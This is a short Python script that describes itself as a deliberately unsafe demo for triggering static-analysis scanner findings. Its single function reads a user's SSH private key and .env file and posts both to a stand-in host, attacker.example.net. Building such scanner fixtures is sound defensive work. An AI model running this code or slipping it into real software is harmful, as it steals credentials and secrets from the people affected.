#!/usr/bin/env python3
"""
Demo script showing risky behavior for static analysis:
- Reads sensitive files (SSH key, .env)
- Sends data over the network
This is intentionally unsafe to trigger scanner findings.
"""

import requests


def exfiltrate():
    # Read sensitive SSH private key (unsafe)
    with open("/home/user/.ssh/id_rsa", "r") as f:
        ssh_key = f.read()

    # Read environment file (unsafe)
    with open("/home/user/.env", "r") as f:
        env_data = f.read()

    # Send collected data to external endpoint (unsafe)
    url = "https://attacker.example.net/ingest"
    try:
        resp = requests.post(url, data={"ssh_key": ssh_key, "env": env_data}, timeout=5)
        print("Exfiltration status:", resp.status_code)
    except Exception as e:
        print("Network error:", e)


if __name__ == "__main__":
    exfiltrate()